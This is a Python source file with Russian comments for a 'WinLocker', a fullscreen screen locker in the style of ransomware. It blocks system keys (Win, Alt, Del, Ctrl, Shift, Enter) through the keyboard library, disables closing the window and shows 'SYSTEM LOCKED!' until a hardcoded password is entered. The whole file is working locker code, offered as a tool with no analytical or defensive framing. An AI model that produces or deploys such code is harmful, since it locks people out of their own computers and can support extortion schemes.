# -*- coding: utf-8 -*-
import tkinter as tk
from tkinter import messagebox
import keyboard

# Блокировка клавиши Windows
keyboard.block_key("win")
keyboard.block_key("alt")
keyboard.block_key("del")
keyboard.block_key("shift")
keyboard.block_key("ctrl")
keyboard.block_key("enter")

# Настройки
CORRECT_PASSWORD = "2630169145"  # Замените на свой пароль
MAX_ATTEMPTS = 99999999999999999  # Максимальное количество попыток

class WinLocker:
    def __init__(self):
        self.attempts = 0
        self.root = tk.Tk()
        self.setup_window()
        self.create_widgets()
        self.update_instruction()  # Обновляем текст с текущим количеством попыток

    def setup_window(self):
        # Полноэкранный режим и поверх всех окон
        self.root.attributes('-fullscreen', True)
        self.root.attributes('-topmost', True)

        # Блокировка закрытия окна (Alt+F4 и крестик)
        self.root.protocol("WM_DELETE_WINDOW", self.block_close)

        # Запрет сворачивания
        self.root.resizable(False, False)

        # Тёмный фон
        self.root.configure(bg='black')

    def create_widgets(self):
        # Заголовок
        title = tk.Label(
            self.root,
            text="SYSTEM LOCKED!",
            font=("Arial", 40, "bold"),
            fg="red",
            bg="black"
        )
        title.pack(pady=50)

        # Инструкция
        instruction = tk.Label(
            self.root,
            text="",  # Инициализируем пустой текст
            font=("Arial", 20),
            fg="white",
            bg="black"
        )
        instruction.pack(pady=20)
        self.instruction = instruction

        # Поле ввода пароля
        self.password_entry = tk.Entry(
            self.root,
            show="*",  # Скрываем ввод
            font=("Arial", 24),
            width=20,
            justify="center"
        )
        self.password_entry.pack(pady=20)
        self.password_entry.focus()  # Фокусируем на поле ввода

        # Кнопка подтверждения
        submit_btn = tk.Button(
            self.root,
            text="UNLOCKED",
            font=("Arial", 18),
            command=self.check_password,
            bg="darkred",
            fg="white"
        )
        submit_btn.pack(pady=10)

        # Привязка Enter к проверке пароля
        self.root.bind('<Return>', lambda event: self.check_password())

    def update_instruction(self):
        """Обновляет текст инструкции с текущим количеством оставшихся попыток"""
        remaining = MAX_ATTEMPTS - self.attempts
        self.instruction.config(
            text=f"Для разблокировки введите пароль.\nОсталось попыток: {remaining}"
        )

    def check_password(self):
        user_input = self.password_entry.get()

        if user_input == CORRECT_PASSWORD:
            # Успешная разблокировка
            messagebox.showinfo("POVEZLO", "SYSTEM UNLOCKED!")
            self.root.destroy()
        else:
            # Неверный пароль
            self.attempts += 1
            remaining = MAX_ATTEMPTS - self.attempts

            if remaining > 0:
                self.instruction.config(
                    text=f"NO!\nОсталось попыток: {remaining}"
                )
                self.password_entry.delete(0, tk.END)
                self.password_entry.focus()  # Возвращаем фокус на поле ввода
            else:
                # Все попытки исчерпаны
                messagebox.showerror("Блокировка", "Все попытки исчерпаны!")
                self.root.destroy()  # Закрываем окно после исчерпания попыток

    def block_close(self):
        # Препятствует закрытию окна
        pass

    def run(self):
        try:
            self.root.mainloop()
        except Exception as e:
            print(f"Произошла ошибка: {e}")
            input("Нажмите Enter для выхода...")

# Запуск приложения
if __name__ == "__main__":
    app = WinLocker()
    app.run()
    input("Нажмите Enter для выхода...")  # Предотвращает мгновенное закрытие окна cmd
